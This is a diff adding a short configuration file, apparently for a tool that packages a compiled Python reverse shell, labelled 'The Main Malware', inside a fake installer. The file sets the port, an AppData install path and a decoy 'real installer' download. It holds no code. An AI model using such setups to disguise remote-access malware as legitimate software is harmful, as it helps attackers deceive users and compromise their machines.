@@ -1,0 +1,24 @@
+[Installer Name: Used for packaging DONT INCLUDE EXE]
+TalosTwoSetup
+[Installer Description]
+Packaged Talos Two Installer
+[Main File Name: The Main Malware DONT INCLUDE EXE]
+buzz
+[Product Name]
+Talos Two Example
+[File Description]
+Compiled Python Reverse Shell
+[Software Version]
+1.0.0
+[Company Name]
+Angry Bee Security
+
+
+[PORT]
+443
+
+[InstallLocation]
+\AppData\Roaming\Angry Bee Security\
+
+[Real Installer Download]
+https://example.com/
